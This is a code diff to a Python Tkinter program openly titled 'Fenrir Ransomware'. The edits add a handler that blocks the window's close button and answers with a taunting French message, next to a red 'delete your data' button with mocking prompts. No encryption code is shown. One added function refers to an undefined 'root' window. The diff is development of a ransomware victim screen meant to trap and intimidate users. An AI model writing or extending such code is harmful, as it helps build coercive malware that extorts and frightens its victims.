@@ -23,10 +23,17 @@ thread.start()
 def htmlfile():
     webbrowser.open_new_tab('help.html')
 
-#time.sleep(3)
-
 fenrir = Tk()
 fenrir.title("Fenrir Ransomware")
+
+def close_program():
+    root.destroy()
+
+def disable_event():
+    showerror("Vous ne pouvez pas faire ça.", "Vous pensiez vraiment échapper au Fenrir ?")
+    return
+
+fenrir.protocol("WM_DELETE_WINDOW", disable_event)
 
 # Alertbar
 #menubar = Menu(fenrir)
@@ -66,7 +73,7 @@ def callback2():
         showerror("Ah...", "Vous avez peur ? C'est ça ?")
 Button(fenrir, text='Supprimer vos données', command=callback2, bg='red', fg='white').pack(side=RIGHT, padx=5, pady=5)
 
-
+################################################################################
 
 fenrir.withdraw()
 fenrir.update_idletasks()
